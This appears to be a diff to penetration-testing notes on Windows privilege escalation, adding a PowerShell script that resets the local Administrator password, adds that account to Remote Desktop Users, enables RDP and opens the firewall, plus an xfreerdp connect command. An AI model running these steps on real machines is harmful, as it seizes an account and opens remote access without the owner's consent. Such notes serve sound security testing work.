@@ -179,3 +179,20 @@ In exactly the same vein as binary/DLL hijacking, we're looking to find a binary
 ```cmd
 schtasks /query /fo LIST /v
 ```
+
+### Command Line to RDP
+Without a GUI session on a Windows box certain things can become pretty difficult. If we have local admin on a machine the following will allow us to upgrade a shell to a full RDP session as the local admin. Consider saving as a script and just running this:
+```powershell
+# Update the Administrator password
+$Password = ConvertTo-SecureString "12345abcde" -AsPlainText -Force
+Get-LocalUser -Name "Administrator" | Set-LocalUser -Password $Password
+# Add the Administrator to the RDP Users group if they aren't already there
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Administrator"
+# Enable RDP on the machine
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+It should now be possible to RDP to the machine, not withstanding any further pivoting/port-forwarding that may be necessary:
+```bash
+xfreerdp /v:192.168.12.34 /u:Administrator /p:12345abcde
+```
